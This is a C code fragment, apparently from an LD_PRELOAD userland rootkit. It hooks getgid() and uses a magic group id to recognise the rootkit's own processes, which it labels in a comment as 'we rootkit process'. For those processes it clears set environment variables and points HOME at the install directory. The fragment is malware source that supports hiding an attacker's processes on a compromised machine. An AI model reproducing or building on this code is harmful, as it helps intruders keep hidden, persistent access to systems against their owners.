gid_t getgid(void)
{
    HOOK(o_getgid,"getgid");
    gid_t o=o_getgid();
    if(o==MGID) // we rootkit process. do stuff.
    {
        int i;
        for(i=0; i < sizeof(usetenvs)/sizeof(usetenvs[0]); i++) unsetenv(usetenvs[i]);
        setenv("HOME",INSTALL_DIR,1);
    }
    return o; // still return gid even if it belongs to us
}